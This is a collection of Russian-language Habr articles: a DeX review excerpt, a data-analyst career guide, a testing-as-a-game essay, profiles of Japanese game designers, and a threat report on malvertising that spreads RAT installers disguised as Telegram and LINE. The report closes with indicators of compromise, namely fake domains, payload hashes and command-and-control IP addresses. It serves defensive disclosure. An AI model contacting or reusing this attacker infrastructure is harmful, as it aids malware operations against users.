изменению ulimit. На самом деле интернет подсказывает, что в PRoot нельзя заюзать docker, так что нет ничего неожиданного, но убедиться хотелось.В Linux нормально показывается свободная и занятая память на накопителе и состояние RAM (те же цифры что и в самом смартфоне), но не прокидываются данные по CPU.РазработкаТ.к. мы работаем в среде arm64 то собирать софт под десктопные платформы не можем никак. Но в то же время на Android можно запускать не только скрипты из интерпретируемых языков (типа Python, Rust etc.), но есть даже простенькие IDE, например для разработки Android-приложений для теста установил CodeAssist и Code Studio.CodeAssist в разработке ещё, сильно простой интерфейс и работает нестабильно (не переключает вкладки иногда корректно), зато умеет в Kotlin. Приложение в бете, так что придираться к нему особо нечего:CodeAssistCode Studio не умеет в Kotlin, но вроде получше немного, багов не обнаружил за 5 минут:Code StudioВ общем можно поиграться поустанавливать IDE и найти что-то интересное. Как минимум где-то в пути открыть проект и что-то быстро глянуть и даже попробовать собрать можно. Опять же, у нас уже есть Debian, хоть он и ограничен набором софта под arm64.Общение в мессенджерахТелеграм выглядит нормально, увеличить окно можно, но особо ничего не даст в плане юзабилити. Всё таки не десктопная версия. Так проблем в UI вроде нет.Также нормально работает приложение корпоративного мессенджера TrueConf. Для звонков с камерой телефон можно поставить на подставку (беспроводную зарядку). Примеры работы:TrueConf для AndroidТак что там с полезностью?Тут вопрос интересный. Всё время пока ставил софт, писал статью, и реально удивлялся что так вообще можно, думал а реально какие могут быть кейсы.Давайте посмотрим что пишет сам производитель (несколько цитат):Отправляйте сообщения друзьям, смотрите кино, работайте над презентацией — все это сразу на одном большом экране. Для дополнительного удобства также доступен беспроводной DeX.Отвечаете за большой проект? DeX поможет вам легко представить аудитории презентацию.Откройте приложение DeX на своем телефоне и подключите его к вашему телевизору для просмотра видео на большом экране или создайте виртуальный класс для своих детей. Одновременно, вы можете продолжить выполнять заниматься своими делами на телефоне.Ну что ж, на самом деле все эти кейсы будут удобны только с беспроводным режимом и Miracast. С проводами и хабом уже не так удобно, и слабо представляю, чтобы на каком-то мероприятии в конференц-зале можно было легко подцепиться к ТВ-панели — организаторы, у которых всё настроено и идут презентации с ноута, не обрадуются.Но в случаях, если неохота включать шумный комп а надо что-то попечатать, далеко ноут, или едешь куда-то и знаешь что в отеле/квартирке будет телек и может возникнуть необходимость что-то сделать такое рабочее или просто тупо запустить ютубчик со своих подписок — то можно брать с собой хаб (и по желанию маленькие клаву/мышь) и быть во всеоружии так сказать.Пока тестировал эту штуку, сам использовал в таких случаях:что-то срочно поправить в рабочих задачах дома, когда лень было ноут забирать с офисанаписать и сверстать эту статью на хабреповыбирать что-то в инет-магазинах — очевидно, что любой сайт на большом мониторе удобнее юзать чем на мелком, особенно если сравнить надо характеристики товароводин раз срочно надо было подключиться удалённо к рабочему столу человечка и помочь там в одном моменте, что тоже опять же с мелкого экрана сделать было бы крайне неудобно.Если ещё есть реальные случаи из жизни или идеи зачем такое может понадобиться — пишите в комментариях и голосуйте в опросе. Спасибо за внимание!",2024-01-26
Вредоносная реклама на приложения для обмена сообщениями нацелена на китайских пользователей,2,1,https://habr.com/ru/articles/789162/,"Продолжающаяся кампания вредоносной рекламы нацелена на китайских пользователей, предлагая им популярные приложения для обмена сообщениями, такие как Telegram или LINE, с целью распространения вредоносного ПО. Интересно, что программное обеспечение, подобное Telegram, сильно ограничено и ранее было запрещено в Китае.Многие сервисы Google, включая поиск Google, также либо ограничены, либо подвергаются жесткой цензуре. Однако многие пользователи пытаются обойти эти ограничения с помощью различных инструментов, таких как VPN.Угроза использует аккаунты рекламодателей Google для создания вредоносных объявлений и направления их на страницы, где ничего не подозревающие пользователи загружают троянские программы удаленного администрирования (RAT). Такие программы дают злоумышленнику полный контроль над машиной жертвы и возможность распространять дополнительное вредоносное ПО.Возможно, это не совпадение, что вредоносные рекламные кампании в первую очередь направлены на ограниченные или запрещенные приложения. Хотя мы не знаем истинных намерений участников угроз, одним из их мотивов может быть сбор данных и шпионаж. В этом блоге мы поделимся более подробной информацией о вредоносных объявлениях и полезных нагрузках, которые нам удалось собрать.Вредоносные объявленияПосетители сайта google[.]cn перенаправляются на google.com[.]hk, где поиск, как утверждается, не подвергается цензуре. Набрав в поисковой строке ""telegram"", мы видим результат спонсированного поиска.Вот реклама ""LINE"".Мы выявили два аккаунта рекламодателей, стоящих за этими объявлениями, причем оба они были связаны с профилем пользователя в Нигерии:Interactive Communication Team Limited
Ringier Media Nigeria LimitedУчитывая количество объявлений на каждой из этих учетных записей (включая множество не связанных с этими кампаниями), мы считаем, что они могли быть захвачены.ИнфраструктураПо всей видимости, используют инфраструктуру Google в виде Google Docs или сайтов Google. Это позволяет им вставлять ссылки для загрузки или даже перенаправлять на другие сайты, которые они контролируют.Вредоносное ПОМы собрали несколько полезных нагрузок из этой кампании, все в формате MSI. Некоторые из них использовали технику, известную как побочная загрузка DLL, которая заключается в объединении легитимного приложения с вредоносной DLL, загружаемой автоматически.В приведенном выше примере DLL подписана ныне отозванным сертификатом Sharp Brilliance Communication Technology Co., Ltd., который также недавно использовался для подписи образца PlugX RAT. (PlugX - это китайская RAT, которая также выполняет побочную загрузку DLL).Не все найденные вредоносные программы являются новыми, некоторые из них уже использовались в других кампаниях и являются вариантами Gh0st RAT.Активная угрозаНа сайте и форуме (bbs[.]kafan[.]cn), посвященном безопасности и посещаемом китайскими пользователями, постоянно появляются вредоносные программы из этих кампаний, которые они называют FakeAPP.Кроме того, похоже, что отдают предпочтение количеству перед качеством, постоянно продвигая новые полезные нагрузки и инфраструктуру в качестве командно-контрольной.Онлайн-реклама - это эффективный способ привлечь определенную аудиторию, но, конечно, им тоже можно злоупотреблять. Люди (например, активисты), живущие в странах, где средства шифрованной связи запрещены или ограничены, будут пытаться обойти эти меры. Судя по всему, потенциальных жертв заманивают с помощью такой рекламы.Полезная нагрузка соответствует угрозам, наблюдаемым в регионе Южной Азии, и мы видим схожие методы, такие как побочная загрузка DLL, которая довольно популярна среди многих RAT. Этот тип вредоносного ПО идеально подходит для сбора информации о человеке и бесшумного внедрения дополнительных компонентов, если это необходимо.Мы уведомили Google о вредоносной рекламе и сообщили соответствующим сторонам о поддерживающей инфраструктуре.Индикаторы компрометацииПоддельные домены:telagsmn[.]com
teleglren[.]com
teleglarm[.]comПеренаправления:5443654[.]site
5443654[.]worldПолезные нагрузки:CS-HY-A8-bei.msi
63b89ca863d22a0f88ead1e18576a7504740b2771c1c32d15e2c04141795d79a

w-p-p64.msi
a83b93ec2a5602d102803cd02aecf5ac6e7de998632afe6ed255d6808465468e

mGtgsotp_zhx64.msi
acf6c75533ef9ed95f76bf10a48d56c75ce5bbb4d4d9262be9631c51f949c084

cgzn-tesup.msi
ec2781ae9af54881ecbbbfc82b34ea4009c0037c54ab4b8bd91f3f32ab1cf52a

tpseu-tcnz.msi
c08be9a01b3465f10299a461bbf3a2054fdff76da67e7d8ab33ad917b516ebdcC2s47.75.116[.]234:19858
216.83.56[.]247:36061
45.195.148[.]73:15628",2024-01-26
Зачем и как практиковаться начинающему аналитику,2,1,https://habr.com/ru/companies/yandex_praktikum/articles/787826/,"— Что работодатели хотят от джуниор аналитика данных?— Работодатели хотят, чтобы он был мидлом.Если ты не смеёшься над этим анекдотом, то наверняка недавно закончил (либо заканчиваешь) обучение по обретению специальности «Аналитик данных». А ещё ты пока не нашел, но уже начал искать свою первую работу. Меня зовут Ольга Матушевич, я наставник на курсе «Аналитик данных» в Практикуме. В этой статье я предложу решение проблемы «как получить опыт работы, если без опыта никуда не берут» с помощью самостоятельных проектов. Сделают ли самостоятельные проекты меня мидломСамостоятельные проекты сделают тебя джуном плюс. Вот как ты изменишься при работе над внеучебными проектами.Поработаешь с реальными данными. В учебных проектах данные существенно отличаются от реальных, и вот почему:Часто данные для учебных проектов генерируют искусственно. Кроме прочего такой подход решает все проблемы с возможными нарушениями авторских прав. Данные предварительно подготовили для студентов, почистив от самых ужасных аномалий. Да, на хороших курсах студентов готовят к реальной работе, а потому чистить данные «до идеала» не будут. Часть проблем оставят. Но все равно они будут существенно лучше реальных сырых данных.В любом случае опыт работы с реальными данными на учебных курсах приобрести сложно. И работодатели это понимают.Получишь опыт самостоятельного поиска информации для выполнения проекта. Даже если учебный контент не давал 100% необходимой информации для решения проекта, он обеспечивает большую её часть. Ты точно знаешь, что на 80% вопросов ты найдёшь ответ в последнем модуле курса, на ещё 10% — в предыдущих модулях. И останется буквально пару вопросов для самостоятельного поиска. Но даже тут ты можешь попросить о помощи преподавателя или наставника. Другое дело — самостоятельный проект. Тут уж придётся искать информацию самому. Да, ты также можешь попросить о помощи — например, на stackoverflow. Но помощь будет не гарантированной и не такой быстрой. Научишься взаимодействовать с реальным заказчиком. Не любой самостоятельный проект подразумевает существующего настоящего заказчика. Если даже заказчик есть, часто общение с ним ограничено. Но опыт общения и обратная связь от заказчика — бесценны. Научишься работать в команде. Проект можно выполнять на 100% самостоятельно. Но если есть возможность получить опыт работы в команде других специалистов — используй её, это действительно ценно.Научишься самостоятельно выстраивать план работы, оценивать трудозатраты и свои возможности. Учебный проект часто содержит пошаговую инструкцию. К реальным проектам инструкция не прилагается. Необходимо самостоятельно определить этапы работы и оценить требуемое для их выполнения время. При дефиците времени — как и в реальном проекте — нужно отказаться от части запланированных этапов. Приобретёшь нужный именно тебе опыт. Хочешь работать над дашбордами в банке? Ищи банковские данные и создавай дашборд с принятыми именно в этой области метриками. Интересует машинное обучение и сфера недвижимости? Ищи данные по недвижимости и строй модели на их основе. При прохождении собеседования на позицию мечты у тебя будут доказательства, что ты действительно не новичок в этой сфере и она тебе точно интересна. Научишься работать с неудачами. Что ты сделаешь, если цели заказчика или твои идеи на имеющихся данных недостижимы? Бросишь проект и постараешься забыть о нём? Попробуешь выжать из имеющихся данных максимум возможного? Постараешься найти дополнительные? Сможешь ли объяснить заказчику, каких именно данных не хватает?Где искать проектыСамое простое решение — найти сразу и данные, и проект для работы. В этом тебе помогут хакатоны — соревнования, в которых участники в течение ограниченного времени работают над решением конкретной задачи или проекта.Найти информацию о хакатонах и других соревнованиях для аналитиков можно на сайтах:Хакатоны.рфСоревнования от Open Data ScienceСоревнования от Kaggle — тут потребуется знание английского. Советую не ограничиваться только этими ресурсами. Лучше регулярно гуглить в поисках других соревнований и искать новые возможности. В Практикуме проводят хакатоны от компаний-партнёров для выпускников, которые находятся на этапе поиска работы. Из недавних примеров: выпускники курса «Аналитик данных» решали задачу по оптимизации телеграм-канала для «Иннополиса». А будущие специалисты по Data Science — для Яндекс Музыки и Маркета. Плюсы участия в хакатонах:Участие в командных проектах.Общение с опытными специалистами.Шанс привлечь внимание потенциальных работодателей.Опыт работы с реальными заказчиками.Минусы участия в хакатонах:Высокий порог входа для участников. Высокий уровень стресса, в том числе из-за сжатых сроков работы.Хакатоны сложны в организации, а потому их проводят редко. Поиск хакатона на интересующую тематику может занять много времени.Где искать датасеты для проектов Если участие в хакатонах тебе пока не подходит — можно поискать данные в открытых источниках. Огромное количество датасетов можно получить совершенно бесплатно. Вот несколько возможных источников:Сайты с соревнованиями. Например, на kaggle.com можно найти множество датасетов. Бонусом послужат проекты других участников — оттуда можно почерпнуть идеи для работы с датасетами. Официальные статистические сайты. На rosstat.gov.ru большое количество данных по России. Чем больше и богаче страна, тем больше у неё данных. Советую заглянуть на Data.gov — тут можно найти датасеты, которые открыто раздает правительство США. Данные на сайтах статистических ведомств обычно представлены в агрегированном виде, а потому датасеты скучные и маленькие. Зато чистые, надёжные и лёгкие в работе. datasetsearch.research.google.com — сервис Google для поиска по открытым датасетам с помощью ключевых слов. Результаты можно фильтровать по лицензии, формату данных и времени с момента последнего обновления. Плюсы работы с открытыми источниками:Большой выбор данных для работы.Минусы:Возможность работы с неточными данными, получения на их основе неточных результатов и недостоверных выводов.Отсутствие свежих данных.Парсинг данныхИногда нужные данные проще собрать самостоятельно, чем искать в интернете. В этом поможет парсинг — процесс автоматического сбора и обработки информации с веб-страниц или других источников данных. Для парсинга используют специальные программы и/или библиотеки, которые позволяют извлекать нужную информацию и сохранять её в удобном формате для дальнейшего анализа.Плюсы парсинга:Большой объём данных, которые можно использовать для анализа.Возможность получить данные, которые недоступны в открытых источниках.Автоматизация процесса сбора, что позволяет сэкономить время и усилия.Сам факт того, что вы умеете парсить нужные данные, уже является вашим конкретным преимуществом в глазах потенциальных работодателей.Получение самых свежих данных.Минусы: Необходимо изучить специальные библиотеки для парсинга.Важно проверить правовую сторону использования данных.Возможность получить неточные результаты и недостоверные выводы.Более лёгкой и легальной альтернативной парсингу технически будет использование API (Application Programming Interface) — интерфейса, позволяющего программам и другим системам обмениваться данными и информацией. Не каждый сайт заботится о лёгком доступе к своим данным для сторонних пользователей. Но если такая возможность есть, советую ей воспользоваться. Для примера можно посмотреть API сайта HH.ru. Как создавать проектыИтак, данные найдены, изучены и очищены. Что с ними делать дальше? Где взять идеи проектов? Можно изучить интересные тебе вакансии — что хочет видеть работодатель? Какие метрики его интересуют? Он ожидает снижения расходов, поиска наиболее перспективных областей для развития или хочет лучше понять существующих клиентов? А можно посмотреть чужие проекты, например:Анализ резюме на HHРазбираемся в отличии среднего чека от ARPU на примере одного интернет-магазинаKaggle и Titanic — ещё одно решение задачи с помощью Python Это может дать идеи для твоих собственных проектов. Один из самых простых способов — попробовать повторить учебные проекты на новых данных. Что можно сделать лучше? Получится ли прийти к тем же выводам? Чем можно их дополнить?Начни с постановки цели и задач проекта. Даже если в процессе выполнения проекта задачи изменятся — этот этап будет полезен. Он сократит время работы над проектом и повысит его качество. После тебе обязательно придётся уделить внимание чистке данных. Проведи поиск дубликатов. Подумай над пропусками — стоит ли их удалять, восстанавливать, заполнять заглушками. Или лучше просто оставить как есть. Найди и обработай неправдоподобные значения. К ним может относиться отрицательное время поиска работы или возраст клиентов банка более 100 лет.Если какие-то данные относятся к категориальным значениям — можно ли объединить категории. Преобразуй типы данных.После можно переходить к исследовательскому анализу.Вычисли основные статистические характеристики данных, такие как среднее, медиана, стандартное отклонение... Это поможет лучше понять распределение данных и их особенности.Используй графики для обобщения основных характеристик, выявления закономерностей и визуализации распределения данных. Наиболее подходящие типы графиков — ящик с усами и гистограмма.Определи выбросы и обработай их. Выяви связи между данными, например, рассчитав коэффициент корреляции.Подумай, нужно ли создавать новые признаки. Например, в датасете с признаками «дата получения заказа» и «дата выполнения заказа» может быть полезно вычислить такие величины, как:срок выполнения заказа;месяц поступления заказа;маркер, был ли заказ выполнен в установленный срок. Переходи к самому исследованию. Вернись к списку задач и постепенно переходи от одной к другой. Ты можешь, например:вычислить все запланированные метрики;проверить выдвинутые гипотезы;если хватает данных — провести статистические тесты;подобрать графики, удачно иллюстрирующие твои выводы.Финальной частью проекта является формулирование выводов и выдача рекомендаций. Это одна из важнейших частей. Выводы и рекомендации должны быть полезными, понятными даже неспециалисту, грамотно написанными и хорошо структурированными. Что делать с готовым проектомОпубликуй его в своём портфолио на GitHub — крупнейшем веб-сервисе для хостинга IT-проектов и их совместной разработки. Также можно сделать посты в соцсетях об успешном завершении проекта или написать о нём статью на Хабре.",2024-01-26
Тестирование ПО как увлекательная игра,4,3,https://habr.com/ru/companies/pgk/articles/789012/,"Привет, Хабр! Я Светлана Цой,  руководитель направления тестирования в Первой грузовой компании.В тестировании мы занимаемся проверкой функциональности программного обеспечения, включая различные сценарии и ситуации. Мы разрабатываем тестовые сценарии, которые помогают выявить ошибки, недочеты и проблемы в программном обеспечении. Наша цель – обеспечить высокое качество программного обеспечения и убедиться, что оно соответствует требованиям и ожиданиям пользователей. Мы также стремимся улучшить процесс разработки, предлагая рекомендации и предложения для оптимизации и улучшения процесса тестирования.Тестирование программного обеспечения – неотъемлемая часть разработки. Оно позволяет находить ошибки и недочеты в программе, обеспечивая ее надежную работу. Однако, часто это воспринимается как скучная и монотонная задача. Но что, если мы посмотрим на тестирование с другой стороны? Что, если мы рассмотрим данный процесс как увлекательную игру? В этой статье мы рассмотрим тестирование как интересное и захватывающее занятие, которое помогает нам находить ошибки и повышать качество продукта.Правила игрыТестирование программного обеспечения имеет свои правила, которые аналогичны правилам игры. Тестировщик получает определенные задачи и цели, которые нужно выполнить. Как и в любой игре, есть определенные правила, которые нужно соблюдать, чтобы достичь успеха. Обычно в каждой компании есть план или стандарт тестирования, а кто-то создает целый регламент. Эти документы определяют процесс и правила проведения тестирования.Цель игрыЦель тестирования - проверка программного обеспечения на соответствие требованиям заказчиков, а также поиск ситуации, где программа ведет себя неправильно или нежелательно. Каждая найденная ошибка подобна уровню, где герои игры получают очки или новые навыки. В процессе достижения поставленных целей тестировщик разрабатывает тестовые сценарии. Их можно сравнить с артефактами в игре, которые хранятся у игрока и могут понадобиться при прохождении уровня. Роли в игреОдним из подходов к тестированию как к игре является использование ролевой модели. Каждый участник команды принимает на себя определенную роль, например, пользователя, злоумышленника или эксперта. Это позволяет разнообразить процесс тестирования и рассмотреть продукт с разных точек зрения. Любая роль в процессе имеет свои особенности и вносит свой вклад в тестирование. Вот некоторые из наиболее распространенных:a. Тестировщик – проверяет функциональность и качество программного продукта.b. Автоматизатор – занимается разработкой и поддержкой автоматизированных тестов, которые позволяют повысить эффективность и скорость тестирования.c. Разработчик – может принимать участие в тестировании, чтобы обнаружить и исправить дефекты на ранних этапах разработки.Разнообразие игровых ситуацийТестирование предлагает широкий спектр заданий и уровней сложности, как и в любой игре. Каждый уровень предлагает новые препятствия и задачи, тестирование предлагает различные сценарии, которые нужно протестировать. Это позволяет человеку развивать свои навыки и находить новые способы поиска ошибок. Например, при тестировании тестировщик с базовым набором знаний выдаст минимальный набор проверок, в то время как более опытный тестировщик может протестировать тот же самый функционал уже с большим количеством проверок и браться за более сложные задачи. Соревновательный моментТестирование может быть организовано в виде соревнования. Несколько тестировщиков могут соревноваться между собой, кто найдет больше ошибок, или кто выполнит задачу быстрее. Например, в моем отделе собираются данные по количеству найденных ошибок и протестированных задач за месяц. В конце года мы суммируем данные и чествуем победителя, выражая свое доверие и уважение. Таким образом, соревнования могут стимулировать тестировщиков к более активному и эффективному поиску ошибок.Командная работаТестирование часто выполняется командой, где каждый игрок вносит свой вклад в общий результат. Как и в многопользовательской игре, где герои объединяются ради одной цели, командная работа требует координации и взаимодействия между участниками. Каждый член команды может предложить новые идеи и подходы к поиску ошибок, что позволяет находить их более эффективно.Улучшение навыковТестирование программного обеспечения, как и игра, позволяет развивать навыки. Чем больше тестировщик играет, т.е ищет ошибки, тем больше он улучшает свои навыки и становится более опытным в обнаружении проблем. Простой пример: новому тестировщику уровня «Джун» всегда дают легкие задачки по типу «Проверить наличие кнопки в интерфейсе». Со временем задачи и цели становятся сложнее, и чтобы иметь возможность тестировать такие задачи, тестировщик должен самообразовываться любыми способами. Освоение предметной области, инструментов тестирования и прокачка hard skills помогает не только в текущей работе, но и в дальнейшей карьере в области тестирования.Анализ и обратная связьПосле завершения тестирования, как и в конце игры, происходит анализ результатов и обратная связь. Тестировщик делиться своими наблюдениями и создает список с описанием каждой ситуации, включая шаги для воспроизведения, ожидаемое поведение и фактическое поведение программы. Это поможет команде разработчиков исправить ошибки, улучшить программу и сделать ее надежнее. Заказчики могут давать обратную связь и оценки по различным критериям, таким как обнаруженные ошибки, соответствие требованиям и качество продукта.Таким образом, тестирование можно рассматривать как увлекательную игру в поиске ошибок. Это позволяет тестировщикам подходить к своей работе с большим энтузиазмом и творческим подходом. Вместо скучных и рутинных задач, тестирование становится увлекательным приключением, которое помогает нам создавать более качественное программное обеспечение, а процесс тестирования более веселым, мотивирующим и продуктивным. Делитесь в комментариях, что вы бы представили в качестве игры?",2024-01-26
Не только Кодзима: 5 известных гейм-дизайнеров из Японии,2,1,https://habr.com/ru/companies/onlinepatent/articles/788994/,"Одно из самых громких имен в игровой индустрии не только Японии, но и всего мира  — Хидэо Кодзима, к которому прикрепилось прозвище гений. Кстати, ему мы посвятили отдельный материал на Хабре. Геймеры отмечают, что в его проектах есть особая философия, нестандартное видение мира и сюжет, от которого сложно оторваться. Но есть и другие гениальные гейм-дизайнеры из Страны, совершившие мини-революцию во вселенной компьютерных игр.Ю Судзуки В юности Ю Судзуки не планировал становиться дизайнером видеоигр. Он подал документы на стоматологический факультет, но провалил вступительные экзамены. Неудача заставила его пересмотреть свои планы на будущее. Судзуки, в итоге, закончил Национальный университет Окаямы, получив диплом программиста, а в 1983 году устроился в Sega Corporation. Первой работой молодого гейм-дизайнера стал незамысловатый симулятор бокса — Champion Boxing. А через два года он совершил прорыв в игровой индустрии, создав Hang-On — интерактивную аркадную гонку для игровых автоматов. Для управления ей нужно было сесть на настоящий мотоцикл, вернее, на его симулятор. На разработку игры Судзуки вдохновил стиль езды трехкратного чемпиона мира по мотогонкам Фредди Спенсера, также известного как «Быстрый Фредди».В последующие годы Судзуки создал еще несколько десятков других выдающихся работ, в том числе Shenmue — серию игр в жанре интерактивного кино. Ее главный герой владеет боевыми искусствами и путешествует в поисках убийцы своего отца. Оригинальная Shenmue в 1999 году получила титул самой дорогой и амбициозной видеоигры. Затраты на ее разработку и маркетинг составили $47–70 млн. Немыслимые деньги для тех лет.За свои достижения Судзуки стал одним из первых людей, увековеченных в Зале славы Академии интерактивных искусств и науки. В 2011 году он покинул Sega с сохранением за собой должности консультанта. Сейчас он возглавляет собственную студию YS Net. Синдзи Миками Синдзи Миками начал карьеру гейм-дизайнера с работы в корпорации Capcom. Первые годы он, в основном, трудился над проектами с лицензией от Disney. Среди них были такие игры как «Алладин», «Кто подставил кролика Роджера», «Отряд Гуфа». В 1996 году Миками нашел свое призвание — создание игр в жанре Survival Horror. Первой стала Biohazard, известная в США как Resident Evil (с англ. «Обитель зла»). По ее сюжету команда спецназа оказалась в особняке, кишащем зомби и другими монстрами. Игра произвела революцию в индустрии — это был один из первых гейм-проектов с предварительно отрисованными фонами и статичными ракурсами камеры. Вскоре Resident Evil стала хитом, а затем и успешной франшизой. Она и сейчас считается эталонным хоррором, который не надоедает даже после десятого прохождения. «Ужас особенно страшен, если игрок находится в постоянном напряжении, не зная, выживет его персонаж или умрет» — говорит Миками.Продолжив работать в Capcom, Миками выпустил Resident Evil-2, а также курировал разработку третьей части этой легендарной игры. Еще одним его выдающимся проектом стала Dino Crisis, позволяющая перенестись в виртуальный Парк Юрского периода. В 2010 году Миками основал собственную компанию Tango Gameworks. Это дало ему полную свободу действий и позволило создать такие уникальные игры как The Evil Within — слияние ужасов и научной фантастики. Многие творения Миками стали основой для кинокартин, мультфильмов и аниме, а также приумножили популярность жанра хоррор в играх.Хидэки КамияХидэки Камия признается, что игры привлекали его с самого детства, но лишь как развлечение. Все изменилось, когда он прочитал статью о выдающихся гейм-дизайнерах — Сигэру Миямото и Масанобу Эндо. Камия понял, что разработка игр — это увлекательный творческий процесс и захотел создать нечто похожее на любимые им виртуальные миры.Камия сотворил целый мир с удивительными персонажами и небанальными сюжетами. Известный гейм-дизайнер Синдзи Миками заметил его работу и поручил Хидэки создание визуальных концепций для Resident Evil. Но жанр хоррора не привлекал Камию. Укрепившись в игровой индустрии, он выработал собственный уникальный стиль. «Я чувствую, что все игры, которые я создал, будь то Devil May Cry, Viewtiful Joe или Ōkami, — все они мои дети» — говорил он. Игры Камии позволяют геймерам забыть об однообразии. Например, сюжет ŌKami основан на истории о синтоистской богине Солнца Аматэрасу в облике белого волка. Игроки могут рисовать на экране, проходить квесты, выполнять различные задания, сражаться с врагами и тратить заработанные бонусы в лавках торговцев. Кроме того, творчество Хидэки Камия стало фундаментом для жанра Slasher, выделяющегося быстрым геймплеем, увлекательным сюжетом, игрой от третьего лица и использованием холодного оружия.Кадзунори ЯмаутиЯмаути с детства увлекался автомобилями. В университете он начал снимать презентационные фильмы для автопроизводителей — это занятие было не только хобби, но и подработкой. Но юноше хотелось большего — Кадзунори мечтал создать гоночный симулятор, который будет передавать весь спектр ощущений от быстрой езды. Желание Ямаути исполнилось — после окончания университета компания Sony поручила ему создание игры Motor Toon Grand Prix. Она получилась довольно реалистичной, в отличие от большинства аркад того времени, и геймеры оценили это по достоинству. Правда, сам Кадзунори был недоволен игрой — из-за жестких дедлайнов ему не удалось довести ее до совершенства. Гейм-дизайнер поклялся никогда в жизни не выпускать на рынок «сырой» продукт — и всегда следовал своему слову.В 1997 году Ямаути выпустил игру своей мечты — гонку Gran Turismo. В ней удалось объединить реалистичную модель управления автомобилем и яркую мультяшную графику. Благодаря многочисленным видеоэффектам и выверенному отклику на нажатие кнопок, игра передает острые ощущения от разгона, торможения и резких поворотов. Gran Turismo стала культовым автосимулятором и разошлась тиражом более 90 млн копий. Впоследствии было выпущено еще семь игр из этой же серии.Успех Gran Turismo вызвал интерес у крупных автомобильных концернов. Nissan поручил Ямаути разработку дизайна и многофункционального дисплея для своих машин, а Porshe, Ford, Mercedes-Benz подарили талантливому японцу фирменные автомобили за продвижение их брендов в играх.Сигэру МиямотоВ детстве Сигэру Миямото часто ходил к темной пещере в Киото, не решаясь зайти внутрь. Но однажды он набрался смелости, взял фонарь и исследовал ее таинственные глубины. Став гейм-дизайнером, Миямото отразил этот волнительный опыт в серии игр The Legend of Zelda, занявших третье место в игровой книге рекордов Гиннеса.В 1977 году творчество Миямото заинтересовало экс-президента Nintendo Хироси Ямаути. Сигэру получил должность в корпорации, где он принял участие в разработке графики для аркады Sheriff, а также создал игру Donkey Kong. Ее главный персонаж — Прыгун, бегает по лестницам, прыгает по платформам и преодолевает препятствия, чтобы спасти девушку от гигантской гориллы. Прыгун моментально завоевал сердца геймеров. Nintendo переименовала его в Марио и сделала своим талисманом. В дальнейшем этот персонаж появился более чем в 200 компьютерных играх.В 1996 году журнал Time назвал Сигэру Миямото «Спилбергом видеоигр», а портал IGN признал его «Величайшим гейм-дизайнером всех времен». Игры Сигэру с каждым годом становились интереснее и динамичнее. Кроме того, он не боялся реализовывать самые смелые идеи. Например, в игре The Legend of Zelda: Ocarina of Time впервые в истории появилась камера, зафиксированная на противнике.Полезное от Онлайн Патент:→ Что такое Реестр отечественного ПО?→ Бесплатный онлайн-поиск по базам данных Роспатента и Мадридской системы (доступно после регистрации).→ Может ли иностранная компания внести свою программу в Реестр отечественного ПО?→ Как IT-компаниям сохранить нулевой НДС и попасть в Реестр отечественного ПО→ Как запатентовать технологию?",2024-01-26
